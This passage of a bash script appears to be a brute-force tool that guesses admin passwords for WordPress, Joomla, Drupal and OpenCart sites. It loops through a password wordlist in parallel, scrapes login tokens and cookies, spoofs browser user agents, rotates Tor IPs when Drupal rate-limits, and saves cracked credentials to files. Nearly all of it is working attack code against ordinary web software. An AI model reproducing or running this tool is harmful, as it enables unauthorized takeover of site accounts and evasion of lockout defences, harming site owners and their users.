{(trap '' SIGINT && opencart=$(curl --request POST -s --data 'username='$user'&password='$pass'' "$site/admin/index.php" -i --user-agent 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax)' | grep -o '302 Found'); if [[ $opencart == "302 Found" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsopencart ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsopencart \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;
 
let startline+=$threads
let endline+=$threads
#changeip
done
exit 1
}


resume_wp() {
count_pass=$(wc -l $wl_pass | cut -d " " -f1)
curl -s -c cookiewp1.txt --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' "$site/wp-login.php" > /dev/null 2>&1

while [ $token -lt $count_pass ]; do
IFS=$'\n'

for pass in $(sed -n ''$token','$((token+threads))'p' $wl_pass); do


IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
 
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass
let token++
{(trap '' SIGINT && wp=$(curl -s -L -b cookiewp1.txt --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' -d 'log='$user'&pwd='$pass'&testcookie=1&rememberme=forever' "$site/wp-login.php" | grep -o 'dashboard\|wordpress_logged_in' | head -n 1 ); if [[ $wp == "dashboard" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsWP ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsWP \n\e[0m";  kill -1 $$; elif [[ $wp == *'wordpress_logged_in'* ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsWP ;  printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsWP \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;
let token--

#changeip

done
exit 1
}

resume_joomla() {
count_pass=$(wc -l $wl_pass | cut -d " " -f1)

tokenjoomla=$(curl -s -H 'keep_alive=1' -c cookiesjoomla --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' -s "$site/administrator/index.php" | grep -o 'name=\".*\" value=\"1\"' | cut -d '"' -f2);
while [ $token -lt $count_pass ]; do
IFS=$'\n'

for pass in $(sed -n ''$token','$((token+threads))'p' $wl_pass); do


IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
 
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass #token
let token++

{(trap '' SIGINT && joomla=$(curl --user-agent '"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801"' -b cookiesjoomla -s "$site/administrator/index.php" -d 'username='$user'&passwd='$pass'&lang=en-GB&option=user_login&task=login&'$tokenjoomla=1'' -L -H 'keep_alive=1' | grep -o "logout" | head -n 1 ); if [[ $joomla == "logout" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsjoomla ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsjoomla \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;
let token--

#changeip

done
exit 1
}


resume_drupal() {
count_pass=$(wc -l $wl_pass | cut -d " " -f1)


while [ $token -lt $count_pass ]; do
IFS=$'\n'

for pass in $(sed -n ''$token','$((token+threads))'p' $wl_pass); do


IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
 
printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass

let token++
{(trap '' SIGINT && drupal=$(curl -s --header "Content-type: application/x-www-form-urlencoded" --request POST --data 'name='$user'&pass='$pass'&form_id=user_login_form' "$site/user/login/" | grep -o 'Redirecting to\|Try again later' | head -n 1); if [[ $drupal == "Redirecting to" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsdrupal ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsdrupal \n\e[0m";  kill -1 $$; elif [[ $drupal == "Try again later" ]]; then printf "\e[1;93m \n [!] Too many attemps failed!\e[0m\n"; printf "\n\e[1;77m [*] Use threads=5 . Changing Tor IP\e[0m \n"; changeip; fi; ) } & done; wait $!;
let token--

#changeip

done
exit 1
}

resume_opencart() {
count_pass=$(wc -l $wl_pass | cut -d " " -f1)


while [ $token -lt $count_pass ]; do
IFS=$'\n'

for pass in $(sed -n ''$token','$((token+threads))'p' $wl_pass); do


IFS=$'\n'
countpass=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)

printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $pass #token

let token++
{(trap '' SIGINT && opencart=$(curl --request POST -s --data 'username='$user'&password='$pass'' "$site/admin/index.php" -i --user-agent 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.4) Gecko/20030624 Netscape/7.1 (ax)' | grep -o '302 Found'); if [[ $opencart == "302 Found" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.brutecmsopencart ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.brutecmsopencart \n\e[0m";  kill -1 $$; fi; ) } & done; wait $!;
let token--

#changeip

done
exit 1
}



readsite() {

read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] URL: \e[0m' site


}

usetor() {


default_usetor="Y"
read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Use Tor? (\e[0m\e[1;77mY/n\e[1;92m):\e[0m' usetor
usetor="${usetor:-${default_usetor}}"
default_wl_pass="passwords.lst"

if [[ $usetor == "Y" ]] || [[ $usetor == "Yes" ]] || [[ $usetor == "y" ]] || [[ $usertor == "yes" ]]; then
checktor
readsite
checkcmstor
else
readsite
checkcms
fi 

}

case "$1" in --resume) resume ;; *)
#banner
checkroot
dependencies
usetor
esac

